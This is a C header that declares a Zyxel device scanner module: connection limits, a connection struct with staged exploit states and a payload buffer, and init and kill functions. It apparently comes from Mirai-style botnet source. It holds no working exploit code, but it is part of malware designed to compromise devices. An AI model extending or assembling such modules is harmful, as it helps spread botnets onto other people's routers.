#pragma once
#ifdef NP_TELNET
#include <stdint.h>
#include "includes.h"

#define ZYXEL_SCANNER_MAX_CONNS 256
#define ZYXEL_SCANNER_RAW_PPS   256
#define ZYXEL_SCANNER_RDBUF_SIZE 256
#define ZYXEL_SCANNER_HACK_DRAIN 64

struct zyxel_scanner_connection {
	int fd, last_recv;
	enum {
		ZYXEL_SC_CLOSED,
		ZYXEL_SC_CONNECTING,
		ZYXEL_SC_EXPLOIT_STAGE2,
		ZYXEL_SC_EXPLOIT_STAGE3,
	} state;
	ipv4_t dst_addr;
	uint16_t dst_port;
	int rdbuf_pos;
	char rdbuf[ZYXEL_SCANNER_RDBUF_SIZE];
	char payload_buf[2024];
};

void zyxel_scanner_init(void);
void zyxel_scanner_kill(void);
#endif
